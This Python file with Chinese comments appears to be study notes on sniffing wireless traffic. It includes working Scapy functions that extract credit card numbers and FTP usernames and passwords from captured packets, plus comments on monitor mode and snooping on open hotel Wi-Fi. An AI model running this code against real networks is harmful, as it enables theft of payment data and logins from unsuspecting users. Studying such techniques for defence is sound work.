# coding=UTF-8
"""
嗅探无线网络的私人信息

Max Ray Butler:冰人

"""

# 设置你的无线攻击环境
#   增益 Hi-Gain USB 无线网络适配器和网络放大器来创建和测试本章脚本。在 BackTrack5 中的默认网卡驱动允许用户进入混杂模式并发送原始数据帧。此外,它还包含一个外部天线连接,能够让我们附加大功率天线。

# 用 Scapy 测试捕获无线网络
#   使用 aircrack-ng 工具套件,使用 iwconfig 命令列出我们的无线网络适配器
#   运行命令 airmon-ng start wlan0 开启混杂模式：新创建的监控接口 mon0 到我们的 conf.iface。监听到每个数据包,脚本将运行 ptkPrint()函数。如果数据包包含 802.11 标识,802.11 响应,

# 安装 Python 的蓝牙包

# 绵羊墙---被动的监听无线网络的秘密， Peekaboo,显示出无线通讯流量的图像。

# 使用 Python 的正则表达式嗅探信用卡：http://www.regular-expressions.info/creditcard.html。

import re
import optparse
from scapy.all import *
def findCreditCard(pkt):
    raw = pkt.sprintf('%Raw.load%')
    americaRE = re.findall('3[47][0-9]{13}', raw)
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)
    if americaRE:
        print('[+] Found American Express Card: ' + americaRE[0])
    if masterRE:
        print('[+] Found MasterCard Card: ' + masterRE[0])
    if visaRE:
        print('[+] Found Visa Card: ' + visaRE[0])


# 嗅探旅馆客人
#   提供公开的无线网络。通常这些网络没有加密也缺乏任何企业忍着或者加密控制

# 构建 Google 无线搜索记录器
#   Google URL 搜索参数：http://www.google.com/cse/docs/resultsxml.html

# 嗅探 FTP 认证：tcpdump
def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    if user:
        print('[*] Detected FTP Login to ' + str(dest))
        print('[+] User account: ' + str(user[0]))
    elif pswd:
        print('[+] Password: ' + str(pswd[0]))



